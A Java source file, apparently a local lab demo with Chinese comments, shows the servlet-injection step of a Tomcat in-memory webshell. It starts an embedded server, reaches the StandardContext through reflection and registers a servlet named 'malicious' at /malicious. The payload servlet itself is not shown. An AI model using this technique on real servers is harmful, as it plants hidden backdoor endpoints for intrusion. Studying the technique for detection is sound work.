import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.startup.Tomcat;

import javax.servlet.Servlet;
import java.lang.reflect.Field;

public class ServletInjection {

    public static void main(String[] args) throws Exception {
        // 启动 Tomcat
        Tomcat tomcat = new Tomcat();
        tomcat.setPort(8080);
        tomcat.getConnector();

        // 手动创建 StandardContext
        StandardContext standardContext = new StandardContext();
        standardContext.setPath("");
        standardContext.setDocBase("D:\\Dev\\JavaProjects\\tomcat\\apache-tomcat-9.0.97\\webapps\\ROOT");
        standardContext.addLifecycleListener(new Tomcat.DefaultWebXmlListener());
        standardContext.setParentClassLoader(Thread.currentThread().getContextClassLoader());

        // 添加 StandardContext 到 Tomcat
        tomcat.getHost().addChild(standardContext);

        // 创建恶意 Servlet
        Servlet maliciousServlet = new MaliciousServlet();

        // 使用反射获取 StandardContext 的 context 字段
        Field contextField = standardContext.getClass().getDeclaredField("context");
        contextField.setAccessible(true);
        org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(standardContext);

        // 检查 applicationContext 是否为 null
        if (applicationContext == null) {
            throw new NullPointerException("applicationContext is null");
        }

        // 使用反射获取 ApplicationContext 的 context 字段
        Field contextField2 = applicationContext.getClass().getDeclaredField("context");
        contextField2.setAccessible(true);
        org.apache.catalina.core.StandardContext standardContext2 = (org.apache.catalina.core.StandardContext) contextField2.get(applicationContext);

        // 创建 Wrapper 并添加到 StandardContext
        Wrapper wrapper = standardContext2.createWrapper();
        wrapper.setName("malicious");
        wrapper.setServlet(maliciousServlet);
        wrapper.setServletClass(MaliciousServlet.class.getName());
        standardContext2.addChild(wrapper);
        standardContext2.addServletMappingDecoded("/malicious", "malicious");

        // 启动 Tomcat
        tomcat.start();
        tomcat.getServer().await();
    }
}
